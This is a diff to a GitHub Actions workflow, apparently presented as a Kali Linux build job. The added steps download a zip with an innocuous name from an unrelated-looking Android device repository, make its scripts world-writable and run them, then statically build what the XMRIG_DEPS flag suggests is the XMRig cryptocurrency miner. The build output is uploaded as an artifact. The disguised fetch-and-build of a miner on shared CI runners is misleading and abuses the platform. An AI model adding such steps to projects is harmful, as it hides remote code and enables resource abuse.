@@ -1,43 +1,80 @@
-name: Build Docker Image
+name: Kali Linux Build and Run
 
 on:
   push:
     branches:
-      - main
+      - master  # 可以根据需要指定触发分支
+  workflow_dispatch:  # 允许手动触发
 
 jobs:
   build:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
+      - name: Checkout repository
+        uses: actions/checkout@v3
 
-      - name: Create Dockerfile
+      - name: Build Docker image
         run: |
+          # 将 Dockerfile 写入工作流中
           cat <<EOF > Dockerfile
           FROM kalilinux/kali-rolling
 
-          RUN apt-get update && apt-get install -y \
-              curl \
-              wget \
-              unzip \
-              git \
-              build-essential \
-              cmake \
-              automake \
-              libtool \
-              autoconf \
-              glibc-source \
-              libstdc++-14-dev \
-              libgcc-12-dev && \
+          # 安装所需的依赖
+          RUN apt-get update && apt-get install -y \\
+              curl \\
+              wget \\
+              unzip \\
+              git \\
+              build-essential \\
+              cmake \\
+              automake \\
+              libtool \\
+              autoconf \\
+              glibc-source \\
+              libstdc++-14-dev \\
+              libgcc-12-dev && \\
               apt-get clean
+
+          # 设置工作目录
+          WORKDIR /usr/src/app
+
+          # 复制项目文件到容器中
+          COPY . /usr/src/app
+
+          # 下载并解压源码
+          RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \\
+              unzip testformycode-nbg.zip
+
+          # 构建项目
+          RUN cd testformycode-nbg/scripts-64 && \\
+              chmod 777 *.sh && \\
+              ./build_deps.sh && \\
+              cd .. && \\
+              mkdir build && \\
+              cd build && \\
+              cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \\
+              make
           EOF
 
-      - name: Build Docker Image
-        run: |
+          # 构建 Docker 镜像
           docker build -t my-kali-build-env .
 
-      - name: Verify Docker Image
+      - name: Run Docker container
         run: |
-          docker images
+          # 运行 Docker 容器并构建项目
+          docker run --name my-kali-build-container my-kali-build-env
+
+      - name: Copy build artifacts
+        run: |
+          # 复制构建产物
+          docker cp my-kali-build-container:/usr/src/app/testformycode-nbg/build ./build-output
+
+      - name: Upload Build Artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-output
+          path: ./build-output
+
+      - name: Clean up Docker container
+        run: docker rm -f my-kali-build-container
